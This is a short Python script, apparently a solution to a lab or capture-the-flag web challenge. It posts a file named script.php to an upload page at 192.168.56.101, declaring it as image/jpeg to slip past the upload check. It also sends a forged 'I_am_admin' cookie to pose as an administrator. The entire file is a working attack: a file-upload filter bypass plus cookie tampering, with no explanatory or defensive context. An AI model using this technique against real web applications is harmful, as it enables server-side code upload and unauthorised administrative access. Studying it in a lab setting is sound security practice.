import requests
from pathlib import Path

url = "http://192.168.56.101/?page=upload"

# Read the contents of the script.php file
with open('script.php', 'rb') as file:
    file_content = file.read()

# Prepare the payload for the request
files = {
    'uploaded': ('script.php', file_content, 'image/jpeg'),
    'MAX_FILE_SIZE': (None, 10000),
    'Upload': (None, 'Upload'),
}

# Set custom headers
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
    'Referer': 'http://192.168.56.101/?page=upload',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
}

# Send the POST request with the payload and headers
response = requests.post(url, headers=headers, files=files)

# Print the response text
print(response.text)
